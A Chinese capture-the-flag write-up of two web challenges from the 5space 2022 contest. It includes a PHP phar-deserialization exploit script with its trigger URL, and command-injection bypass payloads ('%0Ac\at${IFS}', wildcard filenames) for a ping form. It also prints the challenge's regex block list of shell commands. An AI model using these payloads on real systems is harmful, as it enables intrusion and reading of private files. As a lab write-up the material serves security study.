---
title: 5space 2022 web writeup
date: 2022-09-19 17:51:00
updated: 2022-09-19 20:45:00
tags: [ctf, security]
description: 记录
---

周一，没什么人打比赛，和学弟一起看了看Web题，做出了两道Web。

## 5_web_BaliYun

> 一个简单的图床上传
www.zip有源码

```php
<?php
class upload{
    public $filename;
    public $ext;
    public $size;
    public $Valid_ext;

    public function __construct(){
        $this->filename = $_FILES["file"]["name"];
        $this->ext = end(explode(".", $_FILES["file"]["name"]));
        $this->size = $_FILES["file"]["size"] / 1024;
        $this->Valid_ext = array("gif", "jpeg", "jpg", "png");
    }

    public function start(){
        return $this->check();
    }

    private function check(){
        if(file_exists($this->filename)){
            return "Image already exsists";
        }elseif(!in_array($this->ext, $this->Valid_ext)){
            return "Only Image Can Be Uploaded";
        }else{
            return $this->move();
        }
    }

    private function move(){
        move_uploaded_file($_FILES["file"]["tmp_name"], "upload/".$this->filename);
        return "Upload succsess!";
    }

    public function __wakeup(){
        echo file_get_contents($this->filename);
    }
}


class check_img{
    public $img_name;
    public function __construct(){
        $this->img_name = $_GET['img_name'];
    }

    public function img_check(){
        if(file_exists($this->img_name)){
            return "Image exsists";
        }else{
            return "Image not exsists";
        }
    }
}
```

```php
<!DOCTYPE html>
<html>
<head>
    <title>BaliYun图床</title>
    <link rel="stylesheet" href="css/style.css">
    <link href='//fonts.googleapis.com/css?family=Open+Sans:400,300italic,300,400italic,600,600italic,700,700italic,800,800italic' rel='stylesheet' type='text/css'>
    <link href='//fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>


    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="keywords" content="File Upload widget Widget Responsive, Login Form Web Template, Flat Pricing Tables, Flat Drop-Downs, Sign-Up Web Templates, Flat Web Templates, Login Sign-up Responsive Web Template, Smartphone Compatible Web Template, Free Web Designs for Nokia, Samsung, LG, Sony Ericsson, Motorola Web Design" />
    <script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>
</head>

<body>
<h1>BaliYun图床</h1>
<div class="agile-its">
    <h2>Image Upload</h2>
    <div class="w3layouts">
        <div class="photos-upload-view">
            <form action="index.php" method="post" enctype="multipart/form-data">
                <label for="file">选择文件</label>
                <input type="file" name="file" id="file"><br>
                <input type="submit" name="submit" value="提交">
            </form>
            <div id="messages">
                <p>
                    <?php
                    include("class.php");
                    if(isset($_GET['img_name'])){
                        $down = new check_img();
                        echo $down->img_check();
                    }
                    if(isset($_FILES["file"]["name"])){
                        $up = new upload();
                        echo $up->start();
                    }
                    ?>
                </p>
            </div>
        </div>
        <div class="clearfix"></div>
        <script src="js/filedrag.js"></script>


    </div>
</div>
<div class="footer">
    <p> Powerded by  <a href="http://w3layouts.com/">ttpfx de BaliYun图床</a></p>
</div>

<script type="text/javascript" src="js/jquery.min.js"></script>

</div>
</body>
</html>
```

因为没有serialize且对上传文件后缀有检测然后我们又需要触发__wakeup()来读flag文件，因此只能是用phar反序列化。

exp
```php
<?php
include('class.php');

$a = new upload();
$a -> filename = '/flag';
$poc = serialize($a);

$phar = new Phar('poc.phar');
$phar->stopBuffering();
$phar->setStub('GIF89a' . '<?php __HALT_COMPILER();?>');
$phar->addFromString('test.txt', 'test');
$phar->setMetadata($a);
$phar->stopBuffering();

 print($poc);
```

```
<http://39.107.71.45:13083/?img_name=phar://./upload/poc.png>
```

## 5_web_letmeguess_1

首先是个登陆界面，存在弱密码：admin/admin123。

接下来是个ping命令的执行界面，是个命令注入的题目。

简单测试了一下被过滤的

```
空格 -> $IFS$
:
;
`
/
'
```

可以用`%0Ac\at${IFS}index.php`读取源代码

```php
if (isset($_GET['ip']) && $_GET['ip']) {
         $ip = $_GET['ip'];
         $m = [];
        if (!preg_match_all("/(\||&|;| |\/|cat|flag|touch|more|curl|scp|kylin|echo|tmp|var|run|find|grep|-|`|'|:|<|>|less|more)/", $ip, $m)) {
         $cmd = "ping -c 4{$ip}";
         exec($cmd, $res);
         } else {
             $res = 'Hacker,存在非法语句';
         }
     }
```

`%0afile${IFS}kyli*`

`%0acd${IFS}kyli%0ac\at${IFS}fla*`

![图 1](https://s2.loli.net/2022/09/19/2AMRDUtQ9nGbXs6.png)  
